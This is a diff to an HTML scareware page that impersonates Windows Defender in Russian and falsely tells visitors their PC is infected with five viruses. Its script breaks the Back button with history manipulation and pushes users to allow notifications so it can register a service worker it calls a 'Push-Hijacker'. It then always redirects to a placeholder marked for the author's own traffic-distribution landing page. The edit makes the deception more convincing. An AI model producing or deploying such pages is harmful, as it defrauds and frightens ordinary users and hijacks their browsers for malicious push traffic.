@@ -3,73 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🛡️ CRITICAL SYSTEM ALERT</title>
+    <title>Windows Security Center — Критическая угроза</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
         body {
-            margin: 0; padding: 40px;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(#110000, #330000);
-            color: #ffdddd;
-            text-align: center;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(180deg, #0a0a0a, #1a0000);
+            color: #fff;
             height: 100vh;
+            overflow: hidden;
+            text-align: center;
         }
-        h1 { font-size: 2.8em; color: #ff2222; text-shadow: 0 0 20px red; }
-        .scan { font-size: 22px; margin: 30px 0; }
-        #progress { color: #00ff00; font-weight: bold; }
+        .header {
+            background: #c42b1c;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 600;
+            box-shadow: 0 4px 20px rgba(196, 43, 28, 0.6);
+        }
+        .container {
+            max-width: 680px;
+            margin: 40px auto;
+            padding: 30px;
+            background: rgba(0,0,0,0.85);
+            border: 3px solid #c42b1c;
+            border-radius: 12px;
+            box-shadow: 0 0 40px rgba(196, 43, 28, 0.8);
+        }
+        h1 {
+            font-size: 2.4em;
+            color: #ff4444;
+            margin: 20px 0;
+            text-shadow: 0 0 15px #ff0000;
+        }
+        .virus-count {
+            font-size: 48px;
+            font-weight: 700;
+            color: #ffdd00;
+            margin: 10px 0;
+        }
+        .scan {
+            margin: 30px 0;
+        }
+        .progress {
+            height: 28px;
+            background: #333;
+            border-radius: 30px;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, #00ff00, #ffdd00);
+            transition: width 0.3s linear;
+            box-shadow: 0 0 20px #00ff00;
+        }
+        .threats {
+            text-align: left;
+            background: #220000;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+            font-size: 17px;
+        }
+        .threat {
+            padding: 8px 0;
+            border-bottom: 1px solid #440000;
+        }
+        .threat:last-child { border: none; }
+        .btn {
+            background: #c42b1c;
+            color: white;
+            padding: 18px 50px;
+            font-size: 22px;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 20px 0;
+            box-shadow: 0 8px 25px rgba(196, 43, 28, 0.7);
+            transition: all 0.2s;
+        }
+        .btn:hover {
+            background: #ff3333;
+            transform: scale(1.05);
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 14px;
+            opacity: 0.8;
+        }
     </style>
 </head>
 <body>
-    <h1>🚨 ВАШ КОМПЬЮТЕР ЗАРАЖЁН!</h1>
-    <h2>Обнаружено 5 критических вирусов</h2>
-    <p>Разрешите уведомления для автоматической очистки</p>
+    <div class="header">🛡️ Windows Defender Security Center</div>
     
-    <div class="scan">
-        Сканирование системы: <span id="progress">73%</span>
+    <div class="container">
+        <h1>🚨 КРИТИЧЕСКАЯ УГРОЗА ОБНАРУЖЕНА!</h1>
+        <p style="font-size:21px;">Ваш ПК заражён 5 вредоносными программами</p>
+        
+        <div class="virus-count">5 ВИРУСОВ</div>
+        
+        <div class="scan">
+            <div style="font-size:18px;margin-bottom:10px;">Сканирование системы в реальном времени...</div>
+            <div class="progress">
+                <div class="progress-bar" id="bar"></div>
+            </div>
+            <div id="percent" style="margin-top:8px;font-weight:600;color:#00ff00;">73%</div>
+        </div>
+
+        <div class="threats">
+            <div class="threat">🔴 Trojan.Win32.Generic — Активен</div>
+            <div class="threat">🔴 Spyware.Win32.Keylogger — Активен</div>
+            <div class="threat">🔴 Virus.Win32.Ransomware — Активен</div>
+            <div class="threat">🔴 Adware.Win32.PUP — Активен</div>
+            <div class="threat">🔴 BrowserHijacker.Chrome — Активен</div>
+        </div>
+
+        <button class="btn" onclick="allowNotifications()">✅ РАЗРЕШИТЬ УВЕДОМЛЕНИЯ ДЛЯ ОЧИСТКИ</button>
+        
+        <p style="font-size:18px;color:#ffdd00;margin:15px 0;">⏰ Немедленные действия требуются! Данные могут быть потеряны через 60 секунд.</p>
+        
+        <div class="footer">
+            Microsoft Windows Security • Версия 11.0.22631
+        </div>
     </div>
 
     <script>
-        // 1. History trap (блокировка кнопки Назад)
+        // 1. History trap (ломаем кнопку Назад)
         function trapBack() {
-            for (let i = 0; i < 15; i++) {
-                history.pushState({page: i}, '', location.href + '#trap' + i);
+            for (let i = 0; i < 20; i++) {
+                history.pushState({page: i}, '', '#trap' + i);
             }
             window.addEventListener('popstate', () => history.forward());
         }
 
-        // 2. Notification hijack
+        // 2. Мгновенный запрос уведомлений
         async function hijack() {
-            if (!('Notification' in window)) return;
-            const perm = await Notification.requestPermission();
-            if (perm === 'granted') registerSW();
+            if ('Notification' in window) {
+                const perm = await Notification.requestPermission();
+                if (perm === 'granted') {
+                    registerSW();
+                }
+            }
         }
 
-        // 3. Register Service Worker
+        // 3. Регистрация Service Worker
         async function registerSW() {
-            if (!('serviceWorker' in navigator)) return;
-            try {
-                const reg = await navigator.serviceWorker.register('/sw.js', {scope: '/'});
-                console.log('✅ Push-Hijacker SW registered');
-            } catch (e) { console.error(e); }
+            if ('serviceWorker' in navigator) {
+                try {
+                    await navigator.serviceWorker.register('/sw.js');
+                    console.log('🦠 Push-Hijacker Service Worker активирован');
+                } catch(e) {}
+            }
         }
 
-        // 4. TDS redirect через 4 секунды (в любом случае)
-        function tdsRedirect() {
-            // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
-            window.location.replace('https://example.com'); // ← Замени на свой TDS-лендинг
+        // 4. TDS-редирект через 4 секунды (всегда)
+        setTimeout(() => {
+            window.location.replace('https://example.com'); // ← замени на свой TDS
+        }, 4000);
+
+        // Анимация прогресс-бара
+        function animateProgress() {
+            let progress = 73;
+            const bar = document.getElementById('bar');
+            const percent = document.getElementById('percent');
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 6 + 2;
+                if (progress >= 99) {
+                    progress = 99;
+                    clearInterval(interval);
+                }
+                bar.style.width = progress + '%';
+                percent.textContent = Math.floor(progress) + '%';
+            }, 180);
         }
 
         // Init
         window.onload = () => {
             trapBack();
             hijack();
-            setTimeout(tdsRedirect, 4000);
-
-            // Fake progress
-            let p = 73;
-            setInterval(() => {
-                p = Math.min(99, p + Math.random() * 7);
-                document.getElementById('progress').textContent = Math.floor(p) + '%';
-            }, 280);
+            animateProgress();
         };
     </script>
 </body>
